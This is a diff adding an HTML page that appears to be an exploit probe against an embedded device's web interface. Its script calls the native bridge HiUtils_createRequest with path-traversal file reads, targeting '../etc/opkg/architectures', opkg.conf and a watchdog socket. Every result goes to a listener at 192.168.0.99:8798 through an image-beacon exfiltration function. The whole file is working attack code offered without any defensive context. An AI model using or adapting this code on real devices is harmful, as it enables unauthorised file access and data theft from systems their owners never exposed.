@@ -1,0 +1,15 @@
+<!doctype html><html><head><meta charset="utf-8"></head>
+<body style="background:#000;color:#0f0;font:26px monospace"><pre id="out">u7w2…</pre>
+<script>
+(function(){var out=document.getElementById("out");
+function exfil(t){try{new Image().src="http://192.168.0.99:8798/x?d="+encodeURIComponent(String(t).slice(0,140));}catch(e){}}
+function line(t){out.textContent+="\n"+t;exfil(t);}
+function hi(a,p){try{return HiUtils_createRequest(a,p);}catch(e){return {exc:String(e)};}}
+["../var/run/superwatch_socket","../run/superwatch_socket","../tmp/.recon_probe","../APPS/varlocal/applications/UI/"].forEach(function(p){
+  var j=hi("fileRead",{path:[p],mode:6}); line(p+" -> "+JSON.stringify(j.msg||j.ret).slice(0,120));
+});
+// opkg arch oracle: read opkg.conf (text)
+var o=hi("fileRead",{path:["../APPS/pkgs/opkgmeta/opkg.conf"],mode:6}); line("opkg.conf ret="+o.ret+" "+String(o.msg||"").slice(0,140));
+var o2=hi("fileRead",{path:["../etc/opkg/architectures"],mode:6}); line("architectures ret="+o2.ret+" "+String(o2.msg||"").replace(/\n/g," ").slice(0,140));
+})();
+</script></body></html>
